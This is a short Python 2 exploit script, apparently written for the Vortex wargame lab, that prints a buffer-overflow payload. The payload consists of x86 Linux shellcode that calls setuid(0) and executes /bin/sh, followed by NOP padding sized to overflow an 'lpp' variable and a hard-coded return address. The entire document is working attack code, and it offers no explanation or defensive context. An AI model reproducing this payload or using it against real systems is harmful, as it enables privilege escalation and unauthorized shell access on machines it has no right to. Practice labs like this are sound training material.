import sys

shellcode = "\x6a\x17\x58\x31\xdb\xcd\x80\x31\xd2\x6a\x0b\x58\x52" + \
        "\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53" + \
        "\x89\xe1\xcd\x80"

NOP = "\x90"

if __name__=="__main__":
    if len(sys.argv) > 1 :
        addr = sys.argv[1]
    else:
        addr = "\x8c\x92\x04\x08"

    # number of NOP needed to overflow exactly the lpp variable
    # may be different than this one for vortex labs binary 
    print shellcode + NOP * (128-len(shellcode) + 4)  + addr
